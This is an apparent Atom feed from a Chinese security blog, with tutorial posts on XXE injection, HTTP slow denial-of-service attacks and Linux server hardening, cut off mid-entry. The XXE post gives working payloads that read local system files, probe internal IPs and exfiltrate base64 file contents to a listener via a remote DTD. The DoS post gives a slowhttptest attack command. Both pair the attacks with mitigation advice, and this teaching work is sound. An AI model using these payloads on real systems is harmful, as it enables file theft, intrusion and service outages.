<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>锅哥的日常</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.f4guo.top/"/>
  <updated>2019-10-14T07:04:47.515Z</updated>
  <id>http://www.f4guo.top/</id>
  
  <author>
    <name>锅哥</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>外部服务交互漏洞(DNS)</title>
    <link href="http://www.f4guo.top/2019/10/14/%E5%A4%96%E9%83%A8%E6%9C%8D%E5%8A%A1%E4%BA%A4%E4%BA%92%E6%BC%8F%E6%B4%9E-DNS/"/>
    <id>http://www.f4guo.top/2019/10/14/外部服务交互漏洞-DNS/</id>
    <published>2019-10-14T07:03:39.000Z</published>
    <updated>2019-10-14T07:04:47.515Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="安全研究" scheme="http://www.f4guo.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞分析" scheme="http://www.f4guo.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习XXE</title>
    <link href="http://www.f4guo.top/2019/10/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0XXE/"/>
    <id>http://www.f4guo.top/2019/10/09/从零开始学习XXE/</id>
    <published>2019-10-09T08:40:24.000Z</published>
    <updated>2019-10-10T08:57:15.320Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">学就学懂，不能似懂非懂。——《日常》</font></blockquote><h3 id="1-XML"><a href="#1-XML" class="headerlink" title="1 XML"></a>1 XML</h3><h4 id="1-1-特点"><a href="#1-1-特点" class="headerlink" title="1.1 特点"></a>1.1 特点</h4><p>可扩展标记语言（eXtensible Markup Language）;<br>传输、存储数据，和json类似;<br>XML是不作为的，用来结构化数据，其焦点是数据的内容;<br>HTML用来显示数据，其焦点是数据的外观。</p><a id="more"></a><h4 id="1-2-XML基本结构"><a href="#1-2-XML基本结构" class="headerlink" title="1.2 XML基本结构"></a>1.2 XML基本结构</h4><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素、属性、实体等。<br>实体是用来定义普通文本的变量。实体引用是对实体的引用<br>PCDATA 的意思是被解析的字符数据（parsed character data），是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。<br>CDATA是字符数据（character data）。CDATA 是不会被解析器解析的文本。<br><img src="/images/paperimage/xxe_01.png" alt=""></p><h4 id="1-3-DTD文档定义"><a href="#1-3-DTD文档定义" class="headerlink" title="1.3 DTD文档定义"></a>1.3 DTD文档定义</h4><p>1、内部声明<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line">ex: <span class="hljs-tag">&lt;<span class="hljs-name">!DOCTYOE</span> <span class="hljs-attr">test</span> <span class="hljs-attr">any</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/paperimage/xxe_02.png" alt=""><br>2、外部声明<br>当引用的是一个本地文件，用“SYSTEM”标识；当引用的是一个公共文件的时候，采用“PUBLIC”标识(暂不考虑此种情况)。<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br><span class="line">ex:<span class="hljs-meta">&lt;!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/paperimage/xxe_03.png" alt=""></p><h4 id="1-4-四种实体声明"><a href="#1-4-四种实体声明" class="headerlink" title="1.4 四种实体声明"></a>1.4 四种实体声明</h4><p>1、内部实体声明<br>&lt;!ENTITY 实体名称 “实体的值”&gt;<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="hljs-meta">&lt;!ELEMENT test AA &gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY xxe "Hello"&gt;]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>2、外部实体声明<br>&lt;!ENTITY 实体名称 SYSTEM “URI/URL”&gt;<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="hljs-meta">&lt;!ELEMENT test AA &gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY xxe SYSTEM "test.dtd"&gt;]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上述两种均为引用实体，主要在XML文档中被应用，引用方式：&amp;实体名称; 末尾要带上分号，这个引用将直接转变成实体内容。<br>3、参数实体声明<br>只能在DTD中使用，引用实体的方式：%实体名；<br>&lt;!ENTITY % 实体名称 “实体的值”&gt;<br>&lt;!ENTITY % 实体名称 SYSTEM “URI/URL”&gt;<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="hljs-meta">&lt;!ELEMENT test AA &gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % xxe SYSTEM "http://www.666.com/test.dtd"&gt;</span></span><br><span class="line"><span class="hljs-meta">    %xxe;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>4、公共实体声明(忽略)</p><h3 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2 XXE"></a>2 XXE</h3><p>XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p><pre><code>触发点是上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。是利用了DTD引用外部实体导致的漏洞。</code></pre><h4 id="2-1-漏洞复现1-有回显"><a href="#2-1-漏洞复现1-有回显" class="headerlink" title="2.1 漏洞复现1(有回显)"></a>2.1 漏洞复现1(有回显)</h4><p>只是编写获取XML文件并解析这段php代码就花了很长时间了<br><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-comment">//顾名思义，值为True时表示禁用外部实体。可用于安全防护</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);</span><br><span class="line">    <span class="hljs-comment">//获取POST来的数据</span></span><br><span class="line">    $xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);</span><br><span class="line">    <span class="hljs-comment">//使用DomDocument解析XML</span></span><br><span class="line">    $dom = DOMDocument::loadXML($xmlfile);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">/*也可使用以下代码</span></span><br><span class="line"><span class="hljs-comment">    $dom = new DOMDocument();</span></span><br><span class="line"><span class="hljs-comment">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="hljs-comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//simplexml_import_dom()函数把DOM节点转换为SimpleXMLElement对象。</span></span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="hljs-keyword">echo</span> $creds;</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>1、读取本地文件<br>如图利用burpsuite抓包修改请求方式，新增POST的数据为：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE creds [  </span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span>&amp;goodies;<span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/paperimage/xxe_04.png" alt=""><br>2、内网ip探测<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE creds [  </span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY goodies SYSTEM "php://filter/convert.base64-encode/resource=http://192.168.209.152"&gt; ]&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span>&amp;goodies;<span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/paperimage/xxe_05.png" alt=""><br><img src="/images/paperimage/xxe_06.png" alt=""><br>根据响应时间长短以及返回包判断ip是否存在。更多利用方式参考<a href="https://www.cnblogs.com/flokz/p/xxe.html" target="_blank" rel="noopener">这篇</a></p><h4 id="2-2-漏洞复现1-无回显"><a href="#2-2-漏洞复现1-无回显" class="headerlink" title="2.2 漏洞复现1(无回显)"></a>2.2 漏洞复现1(无回显)</h4><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-comment">//顾名思义，值为True时表示禁用外部实体。可用于安全防护</span></span><br><span class="line">    libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);</span><br><span class="line">    <span class="hljs-comment">//获取POST来的数据</span></span><br><span class="line">    $xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);</span><br><span class="line">    <span class="hljs-comment">//使用DomDocument解析XML</span></span><br><span class="line">    $dom = DOMDocument::loadXML($xmlfile);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">/*也可使用以下代码</span></span><br><span class="line"><span class="hljs-comment">    $dom = new DOMDocument();</span></span><br><span class="line"><span class="hljs-comment">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="hljs-comment">    */</span></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1、带外通道获取数据<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "192.168.1.169:8000/evil.dtd"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;%int;%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>evil2.dtd的内容：<br><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">file</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">php:</span>//<span class="hljs-attr">filter</span>/<span class="hljs-attr">read</span>=<span class="hljs-string">convert.base64-encode/resource</span>=<span class="hljs-string">file:///c:/windows/system.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.209.152:9999?p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/paperimage/xxe_07.png" alt=""><br><img src="/images/paperimage/xxe_08.png" alt=""><br>152的机器为监听机，169的为存放dtd的跳板机。</p><h3 id="3-漏洞挖掘以及修复建议"><a href="#3-漏洞挖掘以及修复建议" class="headerlink" title="3 漏洞挖掘以及修复建议"></a>3 漏洞挖掘以及修复建议</h3><h4 id="3-1-如何挖掘此类漏洞"><a href="#3-1-如何挖掘此类漏洞" class="headerlink" title="3.1 如何挖掘此类漏洞"></a>3.1 如何挖掘此类漏洞</h4><p>XML文件交互的地方居多，有时间的话单独另外总结一下。</p><h4 id="3-2-防御："><a href="#3-2-防御：" class="headerlink" title="3.2 防御："></a>3.2 防御：</h4><p>1.使用开发语言提供的禁用外部实体的方法</p><pre><code>PHP:libxml_disable_entity_loader(True);Java:DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();    dbf.setExpandEntityReferences(false);Python:from lxml import etree xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False))</code></pre><p>2.过滤用户提供的XML数据<br>过滤关键字：&lt;! DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC<br>3.不允许XML中含有自己定义的DTD</p><h3 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4 参考链接"></a>4 参考链接</h3><p><a href="https://www.cnblogs.com/flokz/p/xxe.html" target="_blank" rel="noopener">XXE漏洞原理</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;学就学懂，不能似懂非懂。——《日常》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;1-XML&quot;&gt;&lt;a href=&quot;#1-XML&quot; class=&quot;headerlink&quot; title=&quot;1 XML&quot;&gt;&lt;/a&gt;1 XML&lt;/h3&gt;&lt;h4 id=&quot;1-1-特点&quot;&gt;&lt;a href=&quot;#1-1-特点&quot; class=&quot;headerlink&quot; title=&quot;1.1 特点&quot;&gt;&lt;/a&gt;1.1 特点&lt;/h4&gt;&lt;p&gt;可扩展标记语言（eXtensible Markup Language）;&lt;br&gt;传输、存储数据，和json类似;&lt;br&gt;XML是不作为的，用来结构化数据，其焦点是数据的内容;&lt;br&gt;HTML用来显示数据，其焦点是数据的外观。&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="http://www.f4guo.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞分析" scheme="http://www.f4guo.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>HTTP慢速拒绝服务攻击</title>
    <link href="http://www.f4guo.top/2019/10/09/HTTP%E6%85%A2%E9%80%9F%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
    <id>http://www.f4guo.top/2019/10/09/HTTP慢速拒绝服务攻击/</id>
    <published>2019-10-09T01:46:41.000Z</published>
    <updated>2019-10-09T05:58:08.972Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">即使生活百般刁难，也别成为自己曾经讨厌的那种人。——《日常》</font></blockquote><h3 id="0x00-HTTP慢速拒绝服务攻击"><a href="#0x00-HTTP慢速拒绝服务攻击" class="headerlink" title="0x00 HTTP慢速拒绝服务攻击"></a>0x00 HTTP慢速拒绝服务攻击</h3><p>是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务。<br><a id="more"></a></p><h3 id="0x01慢速攻击分类"><a href="#0x01慢速攻击分类" class="headerlink" title="0x01慢速攻击分类"></a>0x01慢速攻击分类</h3><p>Slow headers：Web应用在处理HTTP请求之前都要先接收完所有的HTTP头部，因为HTTP头部中包含了一些Web应用可能用到的重要的信息。攻击者利用这点，发起一个HTTP请求，一直不停的发送HTTP头部，消耗服务器的连接和内存资源。抓取数据包分析可知，攻击客户端与服务器建立TCP连接后，每30秒才向服务器发送一个HTTP头部，而Web服务器在没接收到2个连续的\r\n时，会认为客户端没有发送完头部，而持续的等客户端发送数据。</p><p>Slow body：攻击者发送一个HTTP POST请求，该请求的Content-Length头部值很大，使得Web服务器或代理认为客户端要发送很大的数据。服务器会保持连接准备接收数据，但攻击客户端每次只发送很少量的数据，使该连接一直保持存活，消耗服务器的连接和内存资源。抓取数据包分析可知，攻击客户端与服务器建立TCP连接后，发送了完整的HTTP头部，POST方法带有较大的Content-Length，然后每10s发送一次随机的参数。服务器因为没有接收到相应Content-Length的body，而持续的等待客户端发送数据。</p><p>Slow read：客户端与服务器建立连接并发送了一个HTTP请求，客户端发送完整的请求给服务器端，然后一直保持这个连接，以很低的速度读取Response，比如很长一段时间客户端不读取任何数据，通过发送Zero Window到服务器，让服务器误以为客户端很忙，直到连接快超时前才读取一个字节，以消耗服务器的连接和内存资源。抓包可见，客户端把数据发给服务器后，服务器发送响应时，收到了客户端的ZeroWindow提示（表示自己没有缓冲区用于接收数据），服务器不得不持续的向客户端发出ZeroWindowProbe包，询问客户端是否可以接收数据。</p><h3 id="0x02-慢速攻击工具slowhttptest"><a href="#0x02-慢速攻击工具slowhttptest" class="headerlink" title="0x02 慢速攻击工具slowhttptest"></a>0x02 慢速攻击工具slowhttptest</h3><p>Kali一键安装：apt-get install slowhttptest</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">测试模式:</span><br><span class="line">-H                            slow header,slowloris默认采用此模式          </span><br><span class="line">-B                            slow body</span><br><span class="line">-R                            远程攻击又名Apache killer</span><br><span class="line">-X                            slow <span class="hljs-built_in">read</span></span><br><span class="line"></span><br><span class="line">报告选项：</span><br><span class="line">-g                            生成具有套接字状态更改的统计信息（默认关闭）</span><br><span class="line">-o file_prefix                将统计信息输出保存在file.html和file.csv中（需要-g）</span><br><span class="line">-v level                      日志信息，详细级别0-4：致命，信息，错误，警告，调试</span><br><span class="line"></span><br><span class="line">常规选项：</span><br><span class="line">-c connections                连接目标连接数（50）</span><br><span class="line">-i seconds                    后续数据之间的间隔（以秒为单位）（10）</span><br><span class="line">-l seconds                    测试目标时间长度，以秒为单位（240）</span><br><span class="line">-r rate                       每秒连接数（50）</span><br><span class="line">-s                            如果需要，Content-Length标头的值（4096）</span><br><span class="line">-t                            在请求中使用的动词，对于slow header和response，默认为GET；对于slow body，默认为POST</span><br><span class="line">-u URL                        目标的绝对URL（http://localhost/）</span><br><span class="line">-x                            在slowloris and Slow POST tests模式中，指定发送的最大数据长度</span><br><span class="line">-f                            Content-Type标头的值（application/x-www-form-urlencoded）</span><br><span class="line">-m                            接受(Accept)标头的值（text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5）</span><br><span class="line"></span><br><span class="line">探测/代理选项：</span><br><span class="line">-d host:port                  为所有连接指定代理</span><br><span class="line">-e host:port                  为探测连接指定代理</span><br><span class="line">-p seconds                    指定等待时间来确认DoS攻击已经成功</span><br><span class="line"></span><br><span class="line">range attack特定选项：</span><br><span class="line">-a                            标头中的起始位置</span><br><span class="line">-b                            标头中的结束位置</span><br><span class="line"></span><br><span class="line">slow <span class="hljs-built_in">read</span>特定选项：</span><br><span class="line">-k                            在连接中重复相同请求的次数。如果服务器支持永久连接，则用于成倍增加响应大小。</span><br><span class="line">-n                            从recv缓冲区读取操作之间的时间间隔，以秒为单位（1）</span><br><span class="line">-w                            slow <span class="hljs-built_in">read</span>模式中指定tcp窗口范围下限</span><br><span class="line">-y                            slow <span class="hljs-built_in">read</span>模式中指定tcp窗口范围上限</span><br><span class="line">-z                            在每次的<span class="hljs-built_in">read</span>中，从buffer中读取数据量</span><br></pre></td></tr></table></figure><p>对于存在该漏洞的某主机，执行命令行：slowhttptest -c 5000 -u <a href="http://xxxx" target="_blank" rel="noopener">http://xxxx</a></p><div align="center"><img src="/images/paperimage/slowhttptest01.png" alt=""></div><h3 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h3><p>针对不同的Server其对慢速http拒绝服务攻击防范方法也不同，建议使用以下措施防范慢速http拒绝服务攻击：<br>【WebSphere】<br>1、限制 HTTP 数据的大小<br>在WebSphere Application Server 中进行如下设置：</p><pre><code>何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。</code></pre><p>另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。<br>设置限制任何请求正文的最大大小。</p><p>2、设置keepalive参数</p><p>打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。<br>这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。</p><p>【Weblogic】<br>1、在配置管理界面中的协议-&gt;一般信息下设置 完成消息超时时间小于400<br>2、在配置管理界面中的协议-&gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。</p><p>【Nginx】<br>1、通过调整$request_method，配置服务器接受http包的操作限制；<br>2、在保证业务不受影响的前提下，调整client_max_body_size, client_body_buffer_size, client_header_buffer_size,large_client_header_buffersclient_body_timeout, client_header_timeout的值，必要时可以适当的增加；<br>3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；<br>4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients = worker_processes * worker_connections。</p><p>【Apache】<br>建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。<br>1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：</p><p>请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。<br>RequestReadTimeout body=10-40,minrate=500</p><p>需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。<br>2、mod_qos用于控制并发连接数。配置例如：</p><p>当服务器并发连接数超过600时，关闭keepalive<br>QS_SrvMaxConnClose 600<br>每个源IP最大并发连接数为50<br>QS_SrvMaxConnPerIP 50</p><p>这两个数值可以根据服务器的性能调整。</p><p>【IHS服务器】<br>先安装最新补丁包，然后启用mod_reqtimeout模块，在配置文件中加入：</p><pre><code>loadModule reqtimeout_module modules/mod_reqtimeout.so</code></pre><p>为mod_reqtimeout模块添加配置：</p><pre><code>&lt;IfModule mod_reqtimeout.c&gt;RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500&lt;/IfModule&gt;</code></pre><p>对于HTTPS站点，建议 header=20-40,MinRate=500。</p><h3 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h3><p><a href="https://blog.csdn.net/alex_bean/article/details/87626834" target="_blank" rel="noopener">https://blog.csdn.net/alex_bean/article/details/87626834</a><br><a href="https://blog.csdn.net/madao1o_o/article/details/88421423" target="_blank" rel="noopener">https://blog.csdn.net/madao1o_o/article/details/88421423</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;font color=&quot;#87CEFF&quot; size=&quot;2&quot;&gt;即使生活百般刁难，也别成为自己曾经讨厌的那种人。——《日常》&lt;/font&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;0x00-HTTP慢速拒绝服务攻击&quot;&gt;&lt;a href=&quot;#0x00-HTTP慢速拒绝服务攻击&quot; class=&quot;headerlink&quot; title=&quot;0x00 HTTP慢速拒绝服务攻击&quot;&gt;&lt;/a&gt;0x00 HTTP慢速拒绝服务攻击&lt;/h3&gt;&lt;p&gt;是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接都将被恶意连接占用，从而无法接受新的请求，导致拒绝服务。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全研究" scheme="http://www.f4guo.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="漏洞分析" scheme="http://www.f4guo.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux服务器安全运维及加固</title>
    <link href="http://www.f4guo.top/2019/09/20/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%E5%8F%8A%E5%8A%A0%E5%9B%BA/"/>
    <id>http://www.f4guo.top/2019/09/20/Linux服务器安全运维及加固/</id>
    <published>2019-09-20T08:08:16.000Z</published>
    <updated>2019-10-09T06:27:26.781Z</updated>
    
    <content type="html"><![CDATA[<blockquote><font color="#87CEFF" size="2">余生很长，请别太过善良。——《日常》</font></blockquote><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>前不久参加了一个网络攻防比赛，需要对自己服务器进行安全加固防止别人获取shell，然后结合工作中有时候会遇到服务器是linux系统且无法进行渗透测试的情况，在此了解一下linux服务器是如何进行安全加固和运维的。<br><a id="more"></a></p><h3 id="0x01-系统"><a href="#0x01-系统" class="headerlink" title="0x01 系统"></a>0x01 系统</h3><p>主要是从以下四个方面入手</p><h4 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h4><p>保存账户的文件，密码强度以及密码设置策略。限制用户登录次数</p><h4 id="认证授权"><a href="#认证授权" class="headerlink" title="认证授权"></a>认证授权</h4><p>文件夹以及文件的权限，用户组以及用户的权限</p><h4 id="协议安全"><a href="#协议安全" class="headerlink" title="协议安全"></a>协议安全</h4><p>SSH、Telnet、禁止匿名FTP登录、禁止ping。</p><p>SSH是一个协议，利用它可以登录到一个远程系统或远程执行系统命令，默认允许root登录，并且sshv1存在缺陷，我们应该在sshd_config禁止root访问和使用sshv2来让ssh更加安全。vim /etc/ssh/sshd_config 修改为<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin    no</span><br></pre></td></tr></table></figure></p><h4 id="审计安全"><a href="#审计安全" 